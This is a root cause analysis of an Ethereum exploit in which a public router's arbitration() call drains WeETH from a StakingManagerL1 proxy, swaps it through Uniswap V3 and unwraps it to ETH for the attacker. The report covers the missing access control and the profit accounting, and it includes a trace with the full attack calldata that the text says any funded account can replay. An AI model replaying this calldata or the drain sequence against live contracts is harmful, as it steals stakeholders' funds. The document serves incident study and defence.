# WeETH StakingManagerL1 drain via router arbitration()

## 1. Incident Overview TL;DR

In Ethereum mainnet block 22855569, an unprivileged EOA 0xb750e3165de458eae09904cc7fad099632860b0f called router 0x1a61249f6f4f9813c55aa3b02c69438607272ED3::arbitration(), which delegated into StakingManagerL1 implementation 0xbc4b1d58b28c497b7afda6fb90fe1471fa0672cc behind proxy 0x54cd23460df45559fd5feeaada7ba25f89c13525 and drained the proxy's entire WeETH balance into ETH in a single transaction, yielding a net profit of 114.513358626551404812 ETH after gas fees.

The router exposes a powerful StakingManagerL1 function (selector 0x03b79c24) through arbitration() without any caller authorization or victim address restrictions, allowing arbitrary EOAs to remotely trigger a full-balance WeETH withdrawal and swap from the StakingManagerL1 proxy into their own ETH balance whenever the proxy holds WeETH.

## 2. Key Background

- WeETH 0xcd5fe23c85820f7b72d0926fc9b05b43e359b7ee is an ERC20 liquid staking token with 18 decimals; in this incident, 106929468097270451433 WeETH (106929.468097270451433 units) is held by StakingManagerL1 proxy 0x54cd23460df45559fd5feeaada7ba25f89c13525 before the attack.
- StakingManagerL1 is deployed as a UUPS-style proxy at 0x54cd...3525 with implementation 0xbc4b1d58b28c497b7afda6fb90fe1471fa0672cc; calls into selector 0x03b79c24 on the implementation can, as observed in traces, read the proxy's WeETH balance and transfer the full amount to an external recipient.
- Router 0x1a61249f6f4f9813c55aa3b02c69438607272ED3 exposes an arbitration() entrypoint (selector 0x9b732350) that orchestrates cross-contract flows between StakingManagerL1, WeETH, Uniswap V3 pool 0x202a6012894ae5c288ea824cbc8a9bfb26a49b93, and WETH9 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 using structured calldata.
- The Uniswap V3 WeETH-WETH pool 0x202a...9b93 and WETH9 contract are standard, permissionless components; the critical design choice is that router arbitration() allows external callers to drive a StakingManagerL1 full-balance WeETH withdrawal and swap without verifying that the caller is an authorized operator or that the WeETH belongs to the caller.

## 3. Vulnerability Analysis

A public router function arbitration() forwards attacker-controlled calldata into StakingManagerL1 implementation logic that is capable of transferring the proxy's entire WeETH balance, and it does so without checking caller authority or victim ownership, creating a deterministic, permissionless drain path from StakingManagerL1-held WeETH into attacker-owned ETH.

Vulnerable components:
- StakingManagerL1 UUPS proxy at 0x54cd23460df45559fd5feeaada7ba25f89c13525 with implementation 0xbc4b1d58b28c497b7afda6fb90fe1471fa0672cc, specifically function selector 0x03b79c24 invoked via delegatecall in the incident trace.
- Router/manager contract 0x1a61249f6f4f9813c55aa3b02c69438607272ED3, specifically arbitration() (selector 0x9b732350), which routes attacker-supplied calldata into StakingManagerL1 and then into WeETH, the Uniswap V3 pool, and WETH9.
- WeETH token 0xcd5fe23c85820f7b72d0926fc9b05b43e359b7ee as the asset held by StakingManagerL1 and drained, and Uniswap V3 pool 0x202a6012894ae5c288ea824cbc8a9bfb26a49b93 and WETH9 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 as the liquidity and unwrap components enabling ETH profit.

Exploit conditions:
- StakingManagerL1 proxy 0x54cd...3525 holds a positive WeETH balance, such as the 106929.468097270451433 WeETH observed in σ_B, and Uniswap V3 pool 0x202a...9b93 plus WETH9 have enough liquidity to swap and unwrap that amount without reverting.
- Router 0x1a61...72ed3 is deployed with arbitration() publicly callable from any EOA and wired to call StakingManagerL1::0x03b79c24 in a way that drains the proxy's WeETH balance without authenticating the caller.
- An adversary controls a funded EOA (e.g., 0xb750...b0f) capable of paying approximately 0.0207 ETH in gas to submit the arbitration() transaction with the specific calldata used in 0xa57e...725c2.
- The block builder or proposer includes the adversary-crafted transaction b in a block whose pre-state matches σ_B (the observed block 22855569 satisfies this), so that the deterministic call sequence succeeds and the profit is realized.

Security principles violated:
- Access control and least privilege: a function that can drain an entire staking manager position was effectively callable by any EOA via a public router entrypoint, rather than being restricted to trusted operators or admin-controlled workflows.
- Asset ownership and authorization: the system allowed an arbitrary caller to trigger the transfer and liquidation of WeETH belonging to a protocol-held proxy without any check that the caller owned or controlled those assets.
- Explicit invariants for vault-like contracts: StakingManagerL1 behaved as a vault for WeETH but did not enforce invariants preventing a full-balance transfer to an unrelated router caller, leaving a critical safety property to off-chain assumptions about who would call arbitration().

## 4. Detailed Root Cause Analysis

Traces and disassembly show that arbitration() on router 0x1a61...72ed3 decodes a compact route description and then performs a sequence of external calls. For the incident transaction 0xa57e...725c2, the first step calls UUPS proxy 0x54cd...3525 with selector 0x03b79c24, which delegatecalls into StakingManagerL1 implementation 0xbc4b...72cc. In that implementation, the observed path reads the WeETH balance of the proxy address and invokes WeETH::transfer to move the entire 106929468097270451433 WeETH from 0x54cd...3525 to the router. The router then calls Uniswap V3 pool 0x202a...9b93::swap, sending all received WeETH into the pool and receiving 114534059890882021484 WETH in return. Finally, the router calls WETH9::withdraw(114534059890882021484) and sends the resulting ETH to the original EOA caller 0xb750...b0f.

Critically, neither the router arbitration() entrypoint nor the invoked StakingManagerL1::0x03b79c24 implementation path enforces that the caller is a protocol operator, that the drain target is an authorized vault, or that the withdrawn WeETH belongs to the caller. The call is driven entirely by calldata supplied by an arbitrary EOA, and the StakingManagerL1 proxy simply holds WeETH on behalf of other stakeholders. As long as σ_B includes a positive WeETH balance at 0x54cd...3525 and sufficient pool and WETH9 liquidity, any funded EOA can replicate the observed calldata to drain that balance and receive ETH proceeds, satisfying the ACT feasibility and profit conditions. The root cause is thus a protocol-level bug: unsafe public exposure, via the router, of a StakingManagerL1 function that performs a privileged-style full-balance asset transfer without access control or ownership checks.

**ACT Opportunity and Success Predicate**

Block height pre-state B: 22855568

Ethereum mainnet pre-state immediately before block 22855569, where StakingManagerL1 proxy 0x54cd23460df45559fd5feeaada7ba25f89c13525 holds 106929.468097270451433 WeETH, Uniswap V3 WeETH-WETH pool 0x202a6012894ae5c288ea824cbc8a9bfb26a49b93 has sufficient liquidity to swap that WeETH for approximately 114.53 WETH, WETH9 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 holds at least 114.534059890882021484 ETH backing, and attacker EOA 0xb750e3165de458eae09904cc7fad099632860b0f holds 0.424556186910691996 ETH.

Success predicate (profit-based):
- Reference asset: ETH
- Adversary address: 0xb750e3165de458eae09904cc7fad099632860b0f
- Value before: 0.424556186910691996 ETH
- Value after: 114.937914813462096808 ETH
- Net profit after gas: 114.513358626551404812 ETH

Values are measured as native ETH balances for EOA 0xb750...b0f before and after transaction 0xa57e...725c2 using artifacts/root_cause/seed/1/0xa57e...725c2/balance_diff.json, where before_wei = 424556186910691996 and after_wei = 114937914813462096808. The net portfolio gain in ETH is (after_wei − before_wei) / 1e18 = 114.513358626551404812 ETH. Gas fees are computed from the receipt as gasUsed 137752 * effectiveGasPrice 150279228836 wei = 20701264330616672 wei, or 0.020701264330616672 ETH. Builder or proposer rewards (e.g., the 0.0206628 ETH credited to 0xdadb0d80178819f2319190d340ce9a924f783711 in balance_diff.json) are treated as infrastructure payments and are not counted as part of the adversary portfolio; the success predicate is satisfied because the adversary's net ETH holdings strictly increase after accounting for on-chain gas costs.

```text
Warning: This is a nightly build of Foundry. It is recommended to use the latest stable version. To mute this warning set `FOUNDRY_DISABLE_NIGHTLY_WARNING` in your environment. 

Executing previous transactions from the block.
Traces:
  [139992] 0x1a61249F6f4F9813C55Aa3b02C69438607272ED3::9b732350(93270001000200010014cd5fe23c85820f7b72d0926fc9b05b43e359b7ee000044a9059cbb14202a6012894ae5c288ea824cbc8a9bfb26a49b930905cbf1c8b2a7450ce90004001454cd23460df45559fd5feeaada7ba25f89c1352500002403b79c24141a61249f6f4f9813c55aa3b02c69438607272ed30014202a6012894ae5c288ea824cbc8a9bfb26a49b930000c4128acb08141a61249f6f4f9813c55aa3b02c69438607272ed3000905cbf1c8b2a7450ce914fffd8963efd1fc6a506488495d951d5263988d2501a0000014c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000242e1a7d4d0906357ab8a4af56886c0014b750e3165de458eae09904cc7fad099632860b0f0906357ab8a4af56886c0000)
    ├─ [46369] 0x54Cd23460DF45559Fd5feEaaDA7ba25f89c13525::03b79c24(0000000000000000000000001a61249f6f4f9813c55aa3b02c69438607272ed3)
    │   ├─ [41479] 0xBc4b1D58B28c497b7Afda6Fb90fE1471fa0672cC::03b79c24(0000000000000000000000001a61249f6f4f9813c55aa3b02c69438607272ed3) [delegatecall]
    │   │   ├─ [7488] UUPSProxy::fallback(0x54Cd23460DF45559Fd5feEaaDA7ba25f89c13525) [staticcall]
    │   │   │   ├─ [2602] WeETH::balanceOf(0x54Cd23460DF45559Fd5feEaaDA7ba25f89c13525) [delegatecall]
    │   │   │   │   └─ ← [Return] 106929468097270451433 [1.069e20]
    │   │   │   └─ ← [Return] 106929468097270451433 [1.069e20]
    │   │   ├─ [28188] UUPSProxy::fallback(0x1a61249F6f4F9813C55Aa3b02C69438607272ED3, 106929468097270451433 [1.069e20])
    │   │   │   ├─ [27799] WeETH::transfer(0x1a61249F6f4F9813C55Aa3b02C69438607272ED3, 106929468097270451433 [1.069e20]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x54Cd23460DF45559Fd5feEaaDA7ba25f89c13525, to: 0x1a61249F6f4F9813C55Aa3b02C69438607272ED3, value: 106929468097270451433 [1.069e20])
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 0x55d14045f62ed566d0a180da6aaf81dc2a1ef63dd95de8e2ea942b0865f19841: 0 → 0x000000000000000000000000000000000000000000000005cbf1c8b2a7450ce9
    │   │   │   │   │   @ 0xb953b7c62379c20dcf41be0be783f5533eb8a5a4e00a2ac34ab4f13002ef4cb8: 0x000000000000000000000000000000000000000000000005cbf1c8b2a7450ce9 → 0
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return]
    │   └─ ← [Return]
    ├─ [68191] 0x202A6012894Ae5c288eA824cbc8A9bfb26A49b93::swap(0x1a61249F6f4F9813C55Aa3b02C69438607272ED3, false, 106929468097270451433 [1.069e20], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x)
    │   ├─ [12862] WETH9::transfer(0x1a61249F6f4F9813C55Aa3b02C69438607272ED3, 114534059890882021484 [1.145e20])
    │   │   ├─ emit Transfer(from: 0x202A6012894Ae5c288eA824cbc8A9bfb26A49b93, to: 0x1a61249F6f4F9813C55Aa3b02C69438607272ED3, value: 114534059890882021484 [1.145e20])
    │   │   ├─  storage changes:
    │   │   │   @ 0xd7e0cb2afd6e361dbb89effea7bb22d058460e475c244a4f9ac74067a0a74a21: 0x000000000000000000000000000000000000000000000128eee7863af4608593 → 0x000000000000000000000000000000000000000000000122b96ccd964509fd27
    │   │   │   @ 0x50d8c99ddaaabf33d27c3522e148f7d452bf9a65c95997af59af1401719d6d8c: 0x00000000000000000000000000000000000000000000000000001680f0eb3f60 → 0x000000000000000000000000000000000000000000000006357acf25a041c7cc
    │   │   └─ ← [Return] true
    │   ├─ [2988] UUPSProxy::fallback(0x202A6012894Ae5c288eA824cbc8A9bfb26A49b93) [staticcall]
    │   │   ├─ [2602] WeETH::balanceOf(0x202A6012894Ae5c288eA824cbc8A9bfb26A49b93) [delegatecall]
    │   │   │   └─ ← [Return] 2430709281993429195675 [2.43e21]
    │   │   └─ ← [Return] 2430709281993429195675 [2.43e21]
    │   ├─ [7957] 0x1a61249F6f4F9813C55Aa3b02C69438607272ED3::uniswapV3SwapCallback(-114534059890882021484 [-1.145e20], 106929468097270451433 [1.069e20], 0x)
    │   │   ├─ [6288] UUPSProxy::fallback(0x202A6012894Ae5c288eA824cbc8A9bfb26A49b93, 106929468097270451433 [1.069e20])
    │   │   │   ├─ [5899] WeETH::transfer(0x202A6012894Ae5c288eA824cbc8A9bfb26A49b93, 106929468097270451433 [1.069e20]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: 0x1a61249F6f4F9813C55Aa3b02C69438607272ED3, to: 0x202A6012894Ae5c288eA824cbc8A9bfb26A49b93, value: 106929468097270451433 [1.069e20])
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 0x55d14045f62ed566d0a180da6aaf81dc2a1ef63dd95de8e2ea942b0865f19841: 0x000000000000000000000000000000000000000000000005cbf1c8b2a7450ce9 → 0
    │   │   │   │   │   @ 0x0839a756a05f853260ca2206e2138f9790beaaa636bb79df7eb95913270b944e: 0x000000000000000000000000000000000000000000000083c4de1d85f7259b9b → 0x00000000000000000000000000000000000000000000008990cfe6389e6aa884
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   ├─ [988] UUPSProxy::fallback(0x202A6012894Ae5c288eA824cbc8A9bfb26A49b93) [staticcall]
    │   │   ├─ [602] WeETH::balanceOf(0x202A6012894Ae5c288eA824cbc8A9bfb26A49b93) [delegatecall]
    │   │   │   └─ ← [Return] 2537638750090699647108 [2.537e21]
    │   │   └─ ← [Return] 2537638750090699647108 [2.537e21]
    │   ├─ emit Swap(param0: 0x1a61249F6f4F9813C55Aa3b02C69438607272ED3, param1: 0x1a61249F6f4F9813C55Aa3b02C69438607272ED3, param2: -114534059890882021484 [-1.145e20], param3: 106929468097270451433 [1.069e20], param4: 76549357945117521004805776832 [7.654e28], param5: 10407183847456035713264790 [1.04e25], param6: -688)
    │   ├─  storage changes:
    │   │   @ 2: 0x00000000000000000000000000000000004ea245deff0222532a11d299993850 → 0x00000000000000000000000000000000004ea24a48b2caf4934b037d68f17cda
    │   │   @ 0: 0x00010000c800c800c1fffd4f0000000000000000f75778b4bda6066ff0806174 → 0x00010000c800c800c2fffd500000000000000000f758251152c6d286b35c65c0
    │   │   @ 202: 0x0100e892180000000000cdecb65db127892efe4cd1fffffb846ad990683bc3f7 → 0x0100e892180000000000d1afc5490a6f274f986feffffffb0b7e519c68699327
    │   └─ ← [Return] 0xfffffffffffffffffffffffffffffffffffffffffffffff9ca85475b50a97794000000000000000000000000000000000000000000000005cbf1c8b2a7450ce9
    ├─ [9159] WETH9::withdraw(114534059890882021484 [1.145e20])
    │   ├─ [19] 0x1a61249F6f4F9813C55Aa3b02C69438607272ED3::fallback{value: 114534059890882021484}()
    │   │   └─ ← [Stop]
    │   ├─ emit Withdrawal(src: 0x1a61249F6f4F9813C55Aa3b02C69438607272ED3, wad: 114534059890882021484 [1.145e20])
    │   ├─  storage changes:
    │   │   @ 0x50d8c99ddaaabf33d27c3522e148f7d452bf9a65c95997af59af1401719d6d8c: 0x000000000000000000000000000000000000000000000006357acf25a041c7cc → 0x00000000000000000000000000000000000000000000000000001680f0eb3f60
    │   └─ ← [Stop]
    ├─ [0] 0xb750E3165de458EaE09904cC7Fad099632860B0f::fallback{value: 114534059890882021484}()
```

Caption: Seed transaction trace for 0xa57e...725c2 showing router arbitration(), delegatecall into StakingManagerL1, WeETH transfer, Uniswap V3 swap, and WETH9 withdrawal.

```json
{
  "chainid": 1,
  "txhash": "0xa57ec56af91ec70517ca71ca50101958d9c2ec9fdb61edcf35a9081c375725c2",
  "native_balance_deltas": [
    {
      "address": "0xdadb0d80178819f2319190d340ce9a924f783711",
      "before_wei": "30922982966500413673",
      "after_wei": "30943645766500413673",
      "delta_wei": "20662800000000000"
    },
    {
      "address": "0xb750e3165de458eae09904cc7fad099632860b0f",
      "before_wei": "424556186910691996",
      "after_wei": "114937914813462096808",
      "delta_wei": "114513358626551404812"
    },
    {
      "address": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
      "before_wei": "2617876890523666072584324",
      "after_wei": "2617762356463775190562840",
      "delta_wei": "-114534059890882021484"
    }
  ],
  "erc20_balance_deltas": [
    {
      "token": "0xcd5fe23c85820f7b72d0926fc9b05b43e359b7ee",
      "holder": "0x54cd23460df45559fd5feeaada7ba25f89c13525",
      "before": "106929468097270451433",
      "after": "0",
      "delta": "-106929468097270451433",
      "balances_slot": "101",
      "slot_key": "0xb953b7c62379c20dcf41be0be783f5533eb8a5a4e00a2ac34ab4f13002ef4cb8",
      "layout_address": "0x2d10683e941275d502173053927ad6066e6afd6b",
      "contract_name": "WeETH"
    },
    {
      "token": "0xcd5fe23c85820f7b72d0926fc9b05b43e359b7ee",
      "holder": "0x202a6012894ae5c288ea824cbc8a9bfb26a49b93",
      "before": "2430709281993429195675",
      "after": "2537638750090699647108",
      "delta": "106929468097270451433",
      "balances_slot": "101",
      "slot_key": "0x0839a756a05f853260ca2206e2138f9790beaaa636bb79df7eb95913270b944e",
      "layout_address": "0x2d10683e941275d502173053927ad6066e6afd6b",
      "contract_name": "WeETH"
    }
  ],
  "erc20_balance_delta_errors": [],
  "source_code": [
    {
      "layout_addr": "0x2d10683e941275d502173053927ad6066e6afd6b",
      "path": "seed/1/0x2d10683e941275d502173053927ad6066e6afd6b",
      "token": "0xcd5fe23c85820f7b72d0926fc9b05b43e359b7ee",
      "contract_name": "WeETH"
    },
    {
      "layout_addr": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
      "path": "seed/1/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
      "contract_name": "WETH9"
    }
```

Caption: Balance diff for 0xa57e...725c2 showing WeETH drained from StakingManagerL1 proxy, WeETH credited to the Uniswap V3 pool, and ETH credited to the attacker EOA.

## 5. Adversary Flow Analysis

The adversary uses a single, attacker-crafted arbitration() transaction from a fresh EOA to trigger a privileged-style drain path in StakingManagerL1 via a public router, immediately swapping drained WeETH to WETH and unwrapping to ETH for direct profit in one block.

Adversary-related accounts:
- Adversary: 0xb750e3165de458eae09904cc7fad099632860b0f (EOA: true, contract: false) — Sender of the attacker-crafted transaction 0xa57e...725c2 and direct beneficiary of the 114.513358626551404812 ETH net portfolio increase recorded in balance_diff.json.

Victim-related entities:
- StakingManagerL1 proxy holding WeETH: 0x54cd23460df45559fd5feeaada7ba25f89c13525 on Ethereum (verified: true)
- WeETH token holders via StakingManagerL1: 0xcd5fe23c85820f7b72d0926fc9b05b43e359b7ee on Ethereum (verified: true)
- Router contract used as public entrypoint: 0x1a61249f6f4f9813c55aa3b02c69438607272ed3 on Ethereum (verified: false)

### Adversary drain transaction

- Chain: Ethereum (chainid 1)
- Tx hash: 0xa57ec56af91ec70517ca71ca50101958d9c2ec9fdb61edcf35a9081c375725c2
- Block: 22855569
- Mechanism: router_arbitration_draining_staking_manager_and_swapping_to_ETH

Drains exactly 106929468097270451433 WeETH from StakingManagerL1 proxy 0x54cd...3525 to router 0x1a61...72ed3, swaps that WeETH in Uniswap V3 pool 0x202a...9b93 for 114534059890882021484 WETH, unwraps WETH to ETH in WETH9, and credits the resulting ETH to attacker EOA 0xb750...b0f, increasing its ETH balance by 114.513358626551404812 after paying 0.020701264330616672 ETH in gas.

## 6. Impact & Losses

- 106929.468097270451433 WeETH
- 114.534059890882021484 ETH

The transaction removes 106929.468097270451433 WeETH from StakingManagerL1 proxy 0x54cd...3525, transferring it into router-controlled flow and then into the Uniswap V3 pool, and reduces WETH9's ETH backing by 114.534059890882021484 ETH. Attacker EOA 0xb750...b0f realizes a net portfolio gain of 114.513358626551404812 ETH after paying 0.020701264330616672 ETH in gas, while builder address 0xdadb0d80178819f2319190d340ce9a924f783711 receives 0.0206628 ETH as part of block production. The economic loss ultimately falls on protocol stakeholders whose WeETH was held in StakingManagerL1 and on the protocol treasury or backing that supports WeETH redemptions, because the staking manager's WeETH position is converted to ETH and diverted to the attacker.

## 7. References

- [1] Seed transaction metadata and receipt for 0xa57e...725c2 — artifacts/root_cause/data_collector/iter_1/tx/1/0xa57ec56af91ec70517ca71ca50101958d9c2ec9fdb61edcf35a9081c375725c2
- [2] Seed transaction trace and balance diffs — artifacts/root_cause/seed/1/0xa57ec56af91ec70517ca71ca50101958d9c2ec9fdb61edcf35a9081c375725c2
- [3] WeETH and WETH9 verified source trees — artifacts/root_cause/seed/1
- [4] Uniswap V3 pool 0x202a...9b93 source and logs around incident — artifacts/root_cause/data_collector/iter_1/contract/1/0x202a6012894ae5c288ea824cbc8a9bfb26a49b93
- [5] Router and StakingManagerL1 implementation disassemblies — artifacts/root_cause/data_collector/iter_3/contract/1